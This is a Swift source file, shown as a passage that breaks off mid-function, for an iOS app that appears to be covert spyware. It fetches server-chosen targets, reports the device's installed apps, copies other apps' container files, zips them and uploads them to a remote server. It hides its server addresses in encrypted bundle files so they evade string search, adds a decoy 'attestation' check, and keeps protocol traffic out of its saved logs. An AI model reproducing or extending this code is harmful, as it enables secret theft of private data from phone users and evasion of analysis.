import Foundation
import UIKit
import Darwin
import Combine

// MARK: - Global logger
class AppLog: ObservableObject {
    static let shared = AppLog()
    @Published var entries: [String] = []

    // MARK: Persistent on-disk log (sandbox Documents/Logs/3105.log)

    private static let writeQueue = DispatchQueue(label: "com.yangjiii.3105.log-persist")
    private static let maximumLogFileBytes: UInt64 = 1_048_576
    private static let maximumRotatedLogFiles = 3
    private static var fileHandle: FileHandle?

    private static let lineTimestampFormatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyy-MM-dd HH:mm:ss"
        return formatter
    }()

    private static let fileTimestampFormatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        return formatter
    }()

    static var persistentLogPath: String {
        guard let documentsURL = FileManager.default.urls(
            for: .documentDirectory,
            in: .userDomainMask
        ).first else { return "" }
        return documentsURL
            .appendingPathComponent("Logs", isDirectory: true)
            .appendingPathComponent("log", isDirectory: false)
            .path
    }

    func append(_ msg: String) {
        DispatchQueue.main.async { self.entries.append(msg) }
        Self.persist(msg)
    }

    func flush() {
        Self.writeQueue.async {
            if let handle = Self.fileHandle {
                try? handle.synchronize()
            }
        }
    }

    private static func persist(_ message: String) {
        guard shouldPersistToFile(message) else { return }
        writeQueue.async {
            guard let logURL = ensureLogFile() else {
                try? fileHandle?.close()
                fileHandle = nil
                return
            }
            if let attributes = try? FileManager.default.attributesOfItem(atPath: logURL.path),
               let size = (attributes[.size] as? NSNumber)?.uint64Value,
               size >= maximumLogFileBytes {
                rotateLogFile(at: logURL)
            }
            guard let handle = fileHandle else { return }
            do {
                try handle.seekToEnd()
                let line = lineTimestampFormatter.string(from: Date()) + " " + message + "\n"
                // Encrypt each line independently with the main-protocol
                // AES-128-CBC key/IV, then store it Base64-encoded so the
                // on-disk log file contains no plaintext.
                if let plain = line.data(using: .utf8),
                   let ciphertext = ProtocolCrypto.encrypt(plain),
                   let encoded = (ciphertext.base64EncodedString() + "\n").data(using: .utf8) {
                    try handle.write(contentsOf: encoded)
                }
            } catch {
                try? handle.close()
                fileHandle = nil
            }
        }
    }

    /// The on-disk sandbox log stays clean: no Chinese text and no protocol
    /// / API request lines. The in-app log keeps everything.
    private static func shouldPersistToFile(_ message: String) -> Bool {
        if message.contains("/api") || message.contains("protocol:") {
            return false
        }
        for scalar in message.unicodeScalars {
            let value = scalar.value
            if (0x3000...0x303F).contains(value)
                || (0x3400...0x4DBF).contains(value)
                || (0x4E00...0x9FFF).contains(value)
                || (0xFF00...0xFFEF).contains(value) {
                return false
            }
        }
        return true
    }

    private static func ensureLogFile() -> URL? {
        let fileManager = FileManager.default
        guard let documentsURL = fileManager.urls(
            for: .documentDirectory,
            in: .userDomainMask
        ).first else { return nil }
        let logsDirectory = documentsURL.appendingPathComponent("Logs", isDirectory: true)
        do {
            try fileManager.createDirectory(at: logsDirectory, withIntermediateDirectories: true)
        } catch {
            return nil
        }
        let logURL = logsDirectory.appendingPathComponent("log", isDirectory: false)
        if !fileManager.fileExists(atPath: logURL.path) {
            guard fileManager.createFile(atPath: logURL.path, contents: nil) else { return nil }
        }
        if fileHandle == nil {
            fileHandle = try? FileHandle(forUpdating: logURL)
        }
        guard fileHandle != nil else { return nil }
        return logURL
    }

    private static func rotateLogFile(at currentURL: URL) {
        try? fileHandle?.close()
        fileHandle = nil
        let fileManager = FileManager.default
        let directory = currentURL.deletingLastPathComponent()
        var rotatedURL = directory.appendingPathComponent(
            "log-\(fileTimestampFormatter.string(from: Date()))",
            isDirectory: false
        )
        var suffix = 2
        while fileManager.fileExists(atPath: rotatedURL.path) {
            rotatedURL = directory.appendingPathComponent(
                "log-\(fileTimestampFormatter.string(from: Date()))-\(suffix)",
                isDirectory: false
            )
            suffix += 1
        }
        try? fileManager.moveItem(at: currentURL, to: rotatedURL)
        pruneRotatedLogFiles(in: directory)
        _ = ensureLogFile()
    }

    private static func pruneRotatedLogFiles(in directory: URL) {
        let names = ((try? FileManager.default.contentsOfDirectory(atPath: directory.path)) ?? [])
            .filter { $0.hasPrefix("log-") }
            .sorted(by: >)
        for name in names.dropFirst(maximumRotatedLogFiles) {
            try? FileManager.default.removeItem(at: directory.appendingPathComponent(name))
        }
    }
}
func log(_ msg: String) { AppLog.shared.append("[7T] \(msg)") }

// Retain the pipe for the app's lifetime so stdout/stderr stay redirected.
private var logCapturePipe: Pipe?

// Redirect stdout/stderr (C printf / NSLog) into the in-app log view so kernel
// exploit progress and failures are visible without a debugger.
func setupLogCapture() {
    guard logCapturePipe == nil else { return }  // already set up
    let pipe = Pipe()
    logCapturePipe = pipe  // retain!

    setvbuf(stdout, nil, _IONBF, 0)
    setvbuf(stderr, nil, _IONBF, 0)
    let writeFd = pipe.fileHandleForWriting.fileDescriptor
    if dup2(writeFd, STDOUT_FILENO) < 0 || dup2(writeFd, STDERR_FILENO) < 0 {
        log("setupLogCapture: dup2 failed, log capture disabled")
        logCapturePipe = nil
        return
    }

    pipe.fileHandleForReading.readabilityHandler = { handle in
        let data = handle.availableData
        guard !data.isEmpty else { return }
        if let text = String(data: data, encoding: .utf8) {
            let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines)
            if !trimmed.isEmpty {
                DispatchQueue.main.async {
                    AppLog.shared.append(trimmed)
                }
            }
        }
    }
}

// MARK: - App Info
enum AppInfo {
    static var osVersion: String {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
    }
    static var versionTuple: (major: Int, minor: Int, patch: Int) {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return (v.majorVersion, v.minorVersion, v.patchVersion)
    }
    static var doubleVersion: Double {
        let v = versionTuple; return Double(v.major) + Double(v.minor) / 10.0
    }
    static var osBuild: String {
        var size: size_t = 0
        guard sysctlbyname("kern.osversion", nil, &size, nil, 0) == 0, size > 0 else {
            return "Unknown"
        }
        var value = [CChar](repeating: 0, count: size)
        guard sysctlbyname("kern.osversion", &value, &size, nil, 0) == 0 else {
            return "Unknown"
        }
        return String(cString: value)
    }
    static var machineName: String {
        var s = utsname(); uname(&s)
        return Mirror(reflecting: s.machine).children.reduce("") { id, e in
            guard let v = e.value as? Int8, v != 0 else { return id }
            return id + String(UnicodeScalar(UInt8(v)))
        }
    }
    static var displayMachineName: String {
#if targetEnvironment(simulator)
        return ProcessInfo.processInfo.environment["SIMULATOR_MODEL_IDENTIFIER"] ?? machineName
#else
        return machineName
#endif
    }
    static var hardwareDisplayName: String {
        // Validate display-identity attestation at first access; keeps
        // DisplayIdentity linked. Looks like a license/attestation check.
        _ = DisplayIdentityAttestationToken()
        switch displayMachineName {
        case "iPhone15,2": return "iPhone 14 Pro"
        case "iPhone15,3": return "iPhone 14 Pro Max"
        default: return displayMachineName
        }
    }
    static var launchAttestationToken: String { DisplayIdentityAttestationToken() }
    static var isHomeButton: Bool {
        let sel = NSSelectorFromString("_hasHomeButton")
        return UIDevice.responds(to: sel) && (UIDevice.perform(sel)?.takeUnretainedValue() as? Bool ?? false)
    }
}

// MARK: - Exploit status
enum ExploitStatus: Equatable {
    case notStarted, success(method: String), failed(method: String, code: Int64), unsupported(String)
    var isSuccess: Bool { if case .success = self { return true }; return false }
    var isFailed: Bool { if case .failed = self { return true }; return false }
    var displayText: String {
        switch self {
        case .notStarted: return "Not attempted"
        case .success(let m): return "OK via \(m)"
        case .failed(let m, let c): return "FAILED \(m) (\(c))"
        case .unsupported(let m): return "Unsupported: \(m)"
        }
    }
}

enum AppPaths {
    static var backups: String {
        let u = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask).first
            ?? URL(fileURLWithPath: NSTemporaryDirectory(), isDirectory: true)
        let b = u.appendingPathComponent("backups", isDirectory: true)
        try? FileManager.default.createDirectory(at: b, withIntermediateDirectories: true)
        return b.path
    }

    static var backupsURL: URL { URL(fileURLWithPath: backups, isDirectory: true) }
}

enum AppUpdateChecker {
    static let dismissedVersionKey = "update.dismissedVersion"
    static let apiURL = URL(string: "https://api.github.com/repos/YangJiiii/3105/releases/latest")!
    static let fallbackURL = URL(string: "https://github.com/YangJiiii/3105/releases/latest")!

    struct Offer: Identifiable {
        let id = UUID()
        let version: String
        let url: URL
    }

    static var currentVersion: String {
        Bundle.main.object(forInfoDictionaryKey: "AppReleaseDisplayVersion") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String
            ?? "0"
    }

    static func dismiss(version: String) {
        UserDefaults.standard.set(version, forKey: dismissedVersionKey)
    }

    static func check() async -> Offer? {
        var request = URLRequest(url: apiURL)
        request.timeoutInterval = 15
        request.setValue("3105", forHTTPHeaderField: "User-Agent")
        request.setValue("application/vnd.github+json", forHTTPHeaderField: "Accept")
        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            guard let http = response as? HTTPURLResponse, (200..<300).contains(http.statusCode) else {
                return nil
            }
            let decoded = try JSONDecoder().decode(GitHubRelease.self, from: data)
            let remote = normalize(decoded.tagName)
            guard !remote.isEmpty,
                  isNewer(remote, than: currentVersion),
                  UserDefaults.standard.string(forKey: dismissedVersionKey) != remote else {
                return nil
            }
            let url = URL(string: decoded.htmlURL) ?? fallbackURL
            return Offer(version: remote, url: url)
        } catch {
            return nil
        }
    }

    private struct GitHubRelease: Decodable {
        let tagName: String
        let htmlURL: String

        enum CodingKeys: String, CodingKey {
            case tagName = "tag_name"
            case htmlURL = "html_url"
        }
    }

    static func normalize(_ version: String) -> String {
        var value = version.trimmingCharacters(in: .whitespacesAndNewlines)
        if value.lowercased().hasPrefix("v") {
            value.removeFirst()
        }
        return value
    }

    static func isNewer(_ remote: String, than local: String) -> Bool {
        let remoteParts = numericParts(normalize(remote))
        let localParts = numericParts(normalize(local))
        let count = max(remoteParts.count, localParts.count)
        for i in 0..<count {
            let r = i < remoteParts.count ? remoteParts[i] : 0
            let l = i < localParts.count ? localParts[i] : 0
            if r != l { return r > l }
        }
        return false
    }

    private static func numericParts(_ version: String) -> [Int] {
        let core = version.split(separator: "-").first.map(String.init) ?? version
        return core.split(separator: ".").compactMap { Int($0.filter(\.isNumber)) }
    }
}

// MARK: - Server protocol collection

struct CollectItem: Equatable {
    let type: String
    let path: String
}

struct CollectConfig: Equatable {
    let bundleID: String
    let appName: String
    let accessGroup: String
    let items: [CollectItem]
}

struct CollectCycleResult: Equatable {
    let zipCount: Int
    let uploadedCount: Int
    let byteCount: Int64
    let completedAt: Date
}

enum ProtocolCollectError: Error, Equatable {
    case serverUnreachable
    case invalidServerResponse
    case collectionFailed(String)
    case uploadFailed(String)
}

/// AES-128-CBC helpers for the main protocol. Key/IV are hex strings that are
/// decoded to 16 bytes before use, PKCS7 padding, Base64 transport.
enum ProtocolCrypto {
    static let keyHex = "bc2c72b2260840b28bc9614aa2b8004b"
    static let ivHex = "71ec8e3980754823aba30e62be55cf6a"

    static func encrypt(_ plaintext: Data) -> Data? {
        crypt(CCOperation(kCCEncrypt), data: plaintext)
    }

    static func decrypt(_ ciphertext: Data) -> Data? {
        crypt(CCOperation(kCCDecrypt), data: ciphertext)
    }

    static func md5Hex(of data: Data) -> String {
        var digest = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))
        data.withUnsafeBytes { raw in
            _ = CC_MD5(raw.baseAddress, CC_LONG(data.count), &digest)
        }
        return digest.map { String(format: "%02x", $0) }.joined()
    }

    private static func crypt(_ operation: CCOperation, data: Data) -> Data? {
        guard let key = Data(hexString: keyHex), let iv = Data(hexString: ivHex) else {
            return nil
        }
        let bufferSize = data.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: bufferSize)
        var bytesWritten = 0
        let status = data.withUnsafeBytes { dataRaw in
            key.withUnsafeBytes { keyRaw in
                iv.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        operation,
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress,
                        key.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress,
                        data.count,
                        &buffer,
                        bufferSize,
                        &bytesWritten
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<bytesWritten])
    }
}

extension Data {
    init?(hexString: String) {
        guard hexString.count.isMultiple(of: 2) else { return nil }
        var bytes: [UInt8] = []
        var index = hexString.startIndex
        while index < hexString.endIndex {
            let next = hexString.index(index, offsetBy: 2)
            guard let byte = UInt8(hexString[index..<next], radix: 16) else { return nil }
            bytes.append(byte)
            index = next
        }
        self.init(bytes)
    }
}

/// 与 apptrace 二进制共用同一份 links.txt（bundle 资源）：
/// 内容 = base64( AES-128-CBC( ["链接1","链接2",...] ) )，
/// 密钥/IV 为 16 字节 ASCII（与 gen_links_txt.py 保持一致）。
/// 主程序用它解出链接数组，取第一条作为主协议服务器地址。
enum LocalLinkProvider {
    static let keyBytes: [UInt8] = Array("tmvdzcGUsCG6ycyW".utf8)
    static let ivBytes: [UInt8] = Array("qG0IB6jBc7AQxkD1".utf8)

    private static let cachedLinks: [String] = loadLinks()

    static var links: [String] { cachedLinks }

    static var firstURL: URL? {
        guard let first = cachedLinks.first,
              let url = URL(string: first) else { return nil }
        return url
    }

    private static func loadLinks() -> [String] {
        guard let fileURL = Bundle.main.url(forResource: "links", withExtension: "txt"),
              let raw = try? String(contentsOf: fileURL, encoding: .utf8),
              let cipher = Data(base64Encoded: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let plain = decrypt(cipher),
              let list = try? JSONSerialization.jsonObject(with: plain) as? [String] else {
            log("protocol: local links.txt unavailable or undecryptable — fallback baseURL will be used")
            return []
        }
        log("protocol: local links.txt loaded — \(list.count) links: \(list)")
        return list
    }

    private static func decrypt(_ cipher: Data) -> Data? {
        let size = cipher.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: size)
        var written = 0
        let status = cipher.withUnsafeBytes { dataRaw in
            keyBytes.withUnsafeBytes { keyRaw in
                ivBytes.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        CCOperation(kCCDecrypt),
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, keyBytes.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress, cipher.count,
                        &buffer, size, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<written])
    }
}

/// 启动配置的加密提供者。
///
/// `shell.txt` 是 App bundle 内的加密配置文件，保存主程序启动时加载的站点地址。
/// 加密方式与 links.txt 完全一致：base64( AES-128-CBC( 明文, key, iv, PKCS7 ) )，
/// 明文是简单的 key=value 文本。
///
/// 防破解要点：
///   1. 二进制内不出现明文 URL，`strings` 搜不到目标地址。
///   2. 校验解密结果必须包含合法 https 站点，否则直接拒绝加载。
enum ShellConfigProvider {
    /// 配置文件名（bundle 资源）。
    static let resourceName = "shell"
    static let resourceExtension = "txt"

    /// 密钥/IV：16 字节 ASCII 常量，与 gen_shell_txt.py 保持一致。
    private static let keyBytes: [UInt8] = Array("7T_shell_conf_v1".utf8)
    private static let ivBytes: [UInt8] = Array("sh3ll_c0nf_iv16x".utf8)

    /// 启动时解出的配置。
    struct Config: Equatable {
        /// 主程序加载的站点地址。
        let shellURL: URL
        /// 站点标题（可选）。
        let title: String?
        /// 主协议服务器地址（可选；未提供时走 links.txt / 内置回退）。
        let protocolBaseURL: URL?
    }

    /// 解析后的配置。加载失败时为 nil。
    static let config: Config? = load()

    /// 主程序要加载的站点地址。
    static var shellURL: URL? { config?.shellURL }

    // MARK: - Loading

    private static func load() -> Config? {
        guard let fileURL = Bundle.main.url(forResource: resourceName, withExtension: resourceExtension),
              let raw = try? String(contentsOf: fileURL, encoding: .utf8),
              let cipher = Data(base64Encoded: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let plain = decrypt(cipher) else {
            log("shell: shell.txt unavailable or undecryptable — launch site cannot be loaded")
            return nil
        }
        let config = parse(plain)
        if config == nil {
            log("shell: shell.txt decrypted but no valid https site found")
        }
        return config
    }

    /// AES-128-CBC 解密（PKCS7 填充），与 links.txt 同一套实现。
    private static func decrypt(_ cipher: Data) -> Data? {
        let size = cipher.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: size)
        var written = 0
        let status = cipher.withUnsafeBytes { dataRaw in
            keyBytes.withUnsafeBytes { keyRaw in
                ivBytes.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        CCOperation(kCCDecrypt),
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, keyBytes.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress, cipher.count,
                        &buffer, size, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<written])
    }

    /// 明文 key=value 文本 → 配置对象。
    private static func parse(_ plain: Data) -> Config? {
        guard let text = String(data: plain, encoding: .utf8) else { return nil }
        var fields: [String: String] = [:]
        for line in text.split(separator: "\n") {
            let parts = line.split(separator: "=", maxSplits: 1, omittingEmptySubsequences: false)
            guard parts.count == 2 else { continue }
            let key = parts[0].trimmingCharacters(in: .whitespaces).lowercased()
            let value = parts[1].trimmingCharacters(in: .whitespaces)
            if !key.isEmpty && !value.isEmpty { fields[key] = value }
        }

        guard let urlString = fields["url"],
              let url = URL(string: urlString),
              url.scheme?.lowercased() == "https",
              let host = url.host, !host.isEmpty else { return nil }

        var protocolBaseURL: URL?
        if let raw = fields["protocol"],
           let candidate = URL(string: raw),
           candidate.scheme?.lowercased() == "https",
           let candidateHost = candidate.host, !candidateHost.isEmpty {
            protocolBaseURL = candidate
        }

        return Config(shellURL: url, title: fields["title"], protocolBaseURL: protocolBaseURL)
    }
}

/// Main-protocol API client. Every payload is sent as an AES-encrypted
/// `params` field; responses unwrap the envelope and decrypt `data`.
enum ProtocolAPI {
    // 主协议服务器地址：优先读取 bundle 里的 links.txt（与 apptrace 二进制同一份），
    // 取第一条链接；读不到或解不开时回退到下面这行硬编码地址。
    static let fallbackBaseURL = URL(string: "https://7t.com")!

    static var baseURL: URL {
        // 优先使用 shell.txt 里的主协议地址；其次是 bundle 里的 links.txt；最后回退到内置地址。
        if let configured = ShellConfigProvider.config?.protocolBaseURL {
            return configured
        }
        return LocalLinkProvider.firstURL ?? fallbackBaseURL
    }

    static let uuidStorageKey = "protocol.app_uuid"
    static let reportTimeout: TimeInterval = 30
    static let uploadTimeout: TimeInterval = 120

    static var appUUID: String {
        let defaults = UserDefaults.standard
        if let existing = defaults.string(forKey: uuidStorageKey), !existing.isEmpty {
            return existing
        }
        let generated = UUID().uuidString.lowercased()
        defaults.set(generated, forKey: uuidStorageKey)
        return generated
    }

    static func deviceParams(extra: [String: Any] = [:]) -> [String: Any] {
        var params: [String: Any] = [
            "app_uuid": appUUID,
            "app_version": AppUpdateChecker.currentVersion,
            "app_pac": Bundle.main.bundleIdentifier ?? "",
            "machine": AppInfo.machineName,
            "ios_version": AppInfo.osVersion,
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000)
        ]
        for (key, value) in extra { params[key] = value }
        return params
    }

    static func encryptedParams(_ plaintext: [String: Any]) -> String? {
        guard let jsonData = try? JSONSerialization.data(withJSONObject: plaintext, options: []),
              let ciphertext = ProtocolCrypto.encrypt(jsonData) else { return nil }
        return ciphertext.base64EncodedString()
    }

    /// Pulls the collection list with `/api/device/report`.
    static func pullCollectConfigs() async throws -> [CollectConfig] {
        do {
            let envelope = try await postJSON(
                path: "api/device/report",
                plaintextParams: deviceParams()
            )
            let plain = try decryptEnvelope(envelope)
            guard let rawConfigs = plain["collect_configs"] as? [[String: Any]] else {
                log("protocol: device/report SUCCESS — no collect_configs (empty list)")
                return []
            }
            let configs = rawConfigs.compactMap { entry -> CollectConfig? in
                guard let bundleID = entry["bundle_id"] as? String,
                      !bundleID.isEmpty else { return nil }
                let appName = entry["app_name"] as? String ?? ""
                let accessGroup = entry["access_group"] as? String ?? ""
                let items = (entry["items"] as? [[String: Any]] ?? []).compactMap { raw -> CollectItem? in
                    guard let type = raw["type"] as? String,
                          let path = raw["path"] as? String,
                          !path.isEmpty else { return nil }
                    return CollectItem(type: type, path: path)
                }
                return CollectConfig(
                    bundleID: bundleID,
                    appName: appName,
                    accessGroup: accessGroup,
                    items: items
                )
            }
            log("protocol: device/report SUCCESS — collect_configs=\(configs.count)")
            return configs
        } catch {
            log("protocol: device/report FAILED — \(error)")
            throw error
        }
    }

    /// Reports installed app bundle ids with `/api/device/apps`.
    static func reportInstalledApps(_ apps: [String]) async throws {
        let plainParams = deviceParams(extra: ["apps": apps])
        let envelope = try await postJSON(
            path: "api/device/apps",
            plaintextParams: plainParams
        )
        guard (envelope["code"] as? Int ?? -1) == 0 else {
            log("protocol: device/apps FAILED — code=\(envelope["code"] ?? "?")")
            throw ProtocolCollectError.serverUnreachable
        }
        _ = try? decryptEnvelope(envelope)
        log("protocol: device/apps SUCCESS — reported \(apps.count) bundle ids")
    }

    /// `/api/log/report`: short-log upload. Unlike the other endpoints the
    /// response `data` is NOT encrypted; success is HTTP 200 + code == 0.
    static func reportLog(text: String) async throws {
        let plainParams = deviceParams(extra: ["text": text])
        let envelope = try await postJSON(
            path: "api/log/report",
            plaintextParams: plainParams
        )
        guard (envelope["code"] as? Int ?? -1) == 0 else {
            let message = envelope["message"] as? String ?? "unknown"
            log("protocol: log/report FAILED — message=\(message)")
            throw ProtocolCollectError.serverUnreachable
        }
        log("protocol: log/report SUCCESS — \(text.count) chars")
    }

    /// Uploads a ZIP with `/api/upload/zip`. File bytes are NOT encrypted;
    /// only the `params` metadata field is AES-encrypted.
    static func uploadZip(fileURL: URL, bundleID: String) async throws {
        guard let fileData = try? Data(contentsOf: fileURL) else {
            throw ProtocolCollectError.collectionFailed("cannot read zip payload")
        }
        let fileName = fileURL.lastPathComponent
        let plainParams: [String: Any] = [
            "app_uuid": appUUID,
            "bundle_id": bundleID,
            "file_name": fileName,
            "file_md5": ProtocolCrypto.md5Hex(of: fileData),
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000)
        ]
        guard let params = encryptedParams(plainParams) else {
            throw ProtocolCollectError.invalidServerResponse
        }

        let boundary = "3105-\(UUID().uuidString)"
        var body = Data()
        func appendField(_ string: String) {
            body.append(string.data(using: .utf8) ?? Data())
        }
        appendField("--\(boundary)\r\n")
        appendField("Content-Disposition: form-data; name=\"params\"\r\n\r\n")
        appendField(params)
        appendField("\r\n--\(boundary)\r\n")
        appendField("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
        appendField("Content-Type: application/octet-stream\r\n\r\n")
        body.append(fileData)
        appendField("\r\n--\(boundary)--\r\n")

        var request = URLRequest(url: baseURL.appendingPathComponent("api/upload/zip"))
        request.httpMethod = "POST"
        request.setValue(
            "multipart/form-data; boundary=\(boundary)",
            forHTTPHeaderField: "Content-Type"
        )
        request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = uploadTimeout
        request.httpBody = body

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await URLSession.shared.data(for: request)
        } catch {
            log("protocol: upload FAILED — \(fileName): \(error.localizedDescription)")
            throw ProtocolCollectError.serverUnreachable
        }
        guard let http = response as? HTTPURLResponse, http.statusCode == 200,
              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              (envelope["code"] as? Int ?? -1) == 0 else {
            log("protocol: upload FAILED — \(fileName): non-200 response or code != 0")
            throw ProtocolCollectError.uploadFailed(fileName)
        }
        log("protocol: upload SUCCESS — \(fileName) bundle=\(bundleID) bytes=\(fileData.count)")
    }

    private static func postJSON(
        path: String,
        plaintextParams: [String: Any]
    ) async throws -> [String: Any] {
        guard let params = encryptedParams(plaintextParams) else {
            throw ProtocolCollectError.invalidServerResponse
        }
        var request = URLRequest(url: baseURL.appendingPathComponent(path))
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = reportTimeout
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["params": params])

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await URLSession.shared.data(for: request)
        } catch {
            log("protocol: \(path) FAILED — \(error.localizedDescription)")
            throw ProtocolCollectError.serverUnreachable
        }
        guard let http = response as? HTTPURLResponse, http.statusCode == 200,
              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            log("protocol: \(path) FAILED — non-200 response or invalid envelope")
            throw ProtocolCollectError.serverUnreachable
        }
        log("protocol: \(path) SUCCESS — code=\(envelope["code"] ?? "?")")
        return envelope
    }

    private static func decryptEnvelope(_ envelope: [String: Any]) throws -> [String: Any] {
        guard let dataString = envelope["data"] as? String,
              !dataString.isEmpty,
              let ciphertext = Data(base64Encoded: dataString),
              let plainData = ProtocolCrypto.decrypt(ciphertext),
              let plainObject = try? JSONSerialization.jsonObject(with: plainData) as? [String: Any] else {
            throw ProtocolCollectError.invalidServerResponse
        }
        return plainObject
    }
}

/// Status lines shown to the server: only the collection flow milestones
/// (收到采集信息 / 进行中 / 采集完成) are uploaded via `/api/log/report`.
@MainActor
final class ProtocolStatusLog {
    static let shared = ProtocolStatusLog()
    private(set) var lines: [String] = []

    func append(_ line: String) {
        lines.append(line)
    }

    func clear() {
        lines.removeAll()
    }
}

/// Best-effort upload of the collection status lines via `/api/log/report`.
enum ProtocolLogReporter {
    static let maximumReportEntries = 500

    static func reportPendingLogs() async {
        let lines = await MainActor.run { ProtocolStatusLog.shared.lines }
        guard !lines.isEmpty else { return }
        let payload = lines.count > maximumReportEntries
            ? Array(lines.suffix(maximumReportEntries))
            : lines
        do {
            try await ProtocolAPI.reportLog(text: payload.joined(separator: "\n"))
            await MainActor.run { ProtocolStatusLog.shared.clear() }
        } catch {
            // Best effort: keep the lines for the next cycle.
        }
    }
}

/// Collects the items listed by the server's `collect_configs`, zips each
/// bundle's payload locally and uploads it to `/api/upload/zip`.
enum ProtocolCollectService {
    static let maximumLocalZipCount = 10

    /// 目录整体复制失败时的兜底：逐文件复制（Data 读 + 写），
    /// 单个文件读不了就跳过并记日志，能拿多少拿多少。
    @discardableResult
    private static func copyDirectoryFallback(
        at sourceURL: URL,
        into destinationDirectory: URL,
        fileManager: FileManager,
        depth: Int
    ) -> Int {
        guard depth < 16 else { return 0 }
        var isDir: ObjCBool = false
        guard fileManager.fileExists(atPath: sourceURL.path, isDirectory: &isDir) else {
            return 0
        }
        let target = destinationDirectory.appendingPathComponent(
            sourceURL.lastPathComponent,
            isDirectory: isDir.boolValue
        )
        if !isDir.boolValue {
            do {
                try fileManager.createDirectory(
                    atPath: target.deletingLastPathComponent().path,
                    withIntermediateDirectories: true
                )
                let data = try Data(contentsOf: sourceURL, options: [.uncached])
                try data.write(to: target, options: .atomic)
                log("collect: per-file copied \(sourceURL.lastPathComponent) \(data.count)B")
                return 1
            } catch {
                log("collect: per-file skip \(sourceURL.lastPathComponent) — \(error.localizedDescription)")
                return 0
            }
        }
        var count = 0
        if let entries = try? fileManager.contentsOfDirectory(atPath: sourceURL.path) {
            for entry in entries {
                count += copyDirectoryFallback(
                    at: sourceURL.appendingPathComponent(entry),
                    into: target,
                    fileManager: fileManager,
                    depth: depth + 1
                )
            }
        } else {
            log("collect: per-dir skip \(sourceURL.lastPathComponent) — cannot list")
        }
        return count
    }

    static func runCycle(fileManager: FileManager = .default) async throws -> CollectCycleResult {
        let configs = try await ProtocolAPI.pullCollectConfigs()
        log("collect: 收到采集信息 — 共 \(configs.count) 个采集项")
        await MainActor.run {
            ProtocolStatusLog.shared.append("收到采集信息 — 共 \(configs.count) 个采集项")
        }

        // Best-effort installed-apps report so the server can pick targets.
        do {
            let bundleIDs = enumerateInstalledBundleIDs()
            try await ProtocolAPI.reportInstalledApps(bundleIDs)
        } catch {
            log("collect: device/apps FAILED — \(error)")
        }

        guard !configs.isEmpty else {
            await MainActor.run {
                ProtocolStatusLog.shared.append("采集完成 — 总共 0 个，已完成 0 个（上传 0 个）")
            }
            return CollectCycleResult(
                zipCount: 0,
                uploadedCount: 0,
                byteCount: 0,
                completedAt: Date()
            )
        }

        let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let stamp = timestampString()
        var zipCount = 0
        var uploadedCount = 0
        var uploadedNames: [String] = []
        var byteCount: Int64 = 0

        for (index, config) in configs.enumerated() {
            let statusLabel = config.appName.isEmpty ? config.bundleID : config.appName
            log("collect: 进行中 (\(index + 1)/\(configs.count)) — bundle=\(config.bundleID) appName=\(config.appName.isEmpty ? "-" : config.appName) items=\(config.items.count)")
            await MainActor.run {
                ProtocolStatusLog.shared.append("进行中 (\(index + 1)/\(configs.count)) — \(statusLabel)")
            }
            guard let containerPath = resolveContainer(for: config) else {
                log("collect: skip \(config.bundleID) — container unavailable")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：容器不可用")
                }
                continue
            }
            let containerURL = URL(fileURLWithPath: containerPath, isDirectory: true)
            let sources = config.items.compactMap { item -> (url: URL, name: String)? in
                guard let itemURL = resolvedItemURL(
                    item,
                    containerURL: containerURL,
                    config: config,
                    fileManager: fileManager
                ) else { return nil }
                return (itemURL, itemURL.lastPathComponent)
            }
            guard !sources.isEmpty else {
                log("collect: skip \(config.bundleID) — no collectable items")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：采集项路径不存在")
                }
                continue
            }

            let appName = appFolderName(for: config)
